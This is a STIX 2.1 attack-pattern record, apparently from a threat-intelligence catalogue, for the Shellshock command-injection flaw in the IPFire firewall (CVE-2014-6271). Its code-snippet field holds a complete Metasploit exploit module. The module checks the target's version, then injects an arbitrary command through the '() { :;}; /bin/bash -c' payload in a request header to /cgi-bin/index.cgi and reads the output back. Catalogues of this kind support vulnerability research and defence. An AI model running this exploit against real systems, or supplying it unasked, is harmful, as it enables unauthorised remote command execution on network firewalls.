{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3749a436-a454-48ae-9aad-1408b77c8857",
    "created": "2024-08-14T17:04:03.184982Z",
    "modified": "2024-08-14T17:04:03.184987Z",
    "name": "IPFire Bash Environment Variable Injection (Shellshock)",
    "description": "( IPFire, a free linux based open source firewall distribution version <= 2.15 Update Core 82 contains an authenticated remote command execution vulnerability via shellshock in the request headers. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ipfire_bashbug_exec.rb",
            "external_id": "ipfire_bashbug_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'IPFire Bash Environment Variable Injection (Shellshock)',\n        'Description'   => %q(\n          IPFire, a free linux based open source firewall distribution,\n          version <= 2.15 Update Core 82 contains an authenticated remote\n          command execution vulnerability via shellshock in the request headers.\n        ),\n        'Author'         =>\n          [\n            'h00die <mike@stcyrsecurity.com>', # module\n            'Claudio Viviani'                  # discovery\n          ],\n        'References'     =>\n          [\n            [ 'EDB', '34839' ],\n            [ 'CVE', '2014-6271']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => %w( linux unix ),\n        'Privileged'     => false,\n        'DefaultOptions' =>\n          {\n            'SSL' => true,\n            'PAYLOAD' => 'cmd/unix/generic'\n          },\n        'Arch'           => ARCH_CMD,\n        'Payload'        =>\n          {\n            'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                'RequiredCmd' => 'generic'\n              }\n          },\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2014-09-29',\n        'Notes' =>\n            {\n              'Stability' => [CRASH_SAFE],\n              'SideEffects' => [],\n              'Reliability' => [],\n              'AKA' => ['Shellshock']\n            }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '']),\n        Opt::RPORT(444)\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => '/cgi-bin/index.cgi',\n        'method'    => 'GET'\n      )\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code == 401\n      /\\<strong\\>IPFire (?<version>[\\d.]{4}) \\([\\w]+\\) - Core Update (?<update>[\\d]+)/ =~ res.body\n\n      if version && update && version == \"2.15\" && update.to_i < 83\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  #\n  # CVE-2014-6271\n  #\n  def cve_2014_6271(cmd)\n    %{() { :;}; /bin/bash -c \"#{cmd}\" }\n  end\n\n  def exploit\n    begin\n      payload = cve_2014_6271(datastore['CMD'])\n      vprint_status(\"Exploiting with payload: #{payload}\")\n      res = send_request_cgi(\n        'uri'       => '/cgi-bin/index.cgi',\n        'method'    => 'GET',\n        'headers'   => { 'VULN' => payload }\n      )\n\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code == 401\n      /<li>Device: \\/dev\\/(?<output>.+) reports/m =~ res.body\n      print_good(output) unless output.nil?\n\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-29",
    "x_mitre_platforms": [
        "%w( linux unix )"
    ]
}